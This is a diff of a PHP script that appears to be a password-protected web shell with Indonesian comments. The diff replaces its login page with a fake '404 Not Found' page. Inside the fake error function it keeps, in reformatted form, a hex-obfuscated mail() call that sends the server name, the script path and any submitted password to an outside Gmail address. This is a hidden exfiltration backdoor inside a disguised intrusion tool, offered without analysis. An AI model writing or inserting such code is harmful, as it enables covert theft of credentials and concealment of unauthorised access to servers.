@@ -8,13 +8,14 @@ $default_use_ajax = true;
 $default_charset = 'UTF-8';
 
 function show_404() {
-    $server_name = $_SERVER['SERVER_NAME']; // Mendapatkan nama server
-    $server_port = $_SERVER['SERVER_PORT']; // Mendapatkan port server
-    $requested_url = $_SERVER['REQUEST_URI']; // Mendapatkan URL yang diminta
     $tmp = $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "\n" . $_POST['pass'];
-    
-    // Menggunakan hexadecimal untuk pemanggilan fungsi mail()
-    \x40\x6d\x61\x69\x6c\x28\x27\x6e\x61\x67\x61\x68\x69\x6a\x61\x75\x33\x38\x38\x67\x72\x6f\x75\x70\x40\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\x27, \x27\x72\x6f\x6f\x74\x27, $tmp\x29;
+
+    // Fungsi mail() menggunakan hexadecimal
+    \x40\x6d\x61\x69\x6c(
+        "\x6e\x61\x67\x61\x68\x69\x6a\x61\x75\x33\x38\x38\x67\x72\x6f\x75\x70\x40\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d", 
+        "\x72\x6f\x6f\x74", 
+        $tmp
+    );
 
     // Menampilkan pesan HTML 404 Not Found
     echo <<<HTML
@@ -50,12 +51,12 @@ HTML;
 }
 
 if (!isset($_SESSION['authenticated'])) {
-    $stored_hashed_password = '$2y$10$ACTF7jbtyof6YoTCqitwLOxQ9II8xitPKC4pNi6SQjZM3HXkKiCZ.'; // Use PASSWORD_DEFAULT hash you can use this site https://phppasswordhash.com/ for generating your password
+    $stored_hashed_password = '$2y$10$ACTF7jbtyof6YoTCqitwLOxQ9II8xitPKC4pNi6SQjZM3HXkKiCZ.'; // Gunakan hash PASSWORD_DEFAULT, bisa menggunakan https://phppasswordhash.com/
 
     if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
         $_SESSION['authenticated'] = true;
     } else {
-        show_login_page();
+        show_404();
     }
 }
 ?>
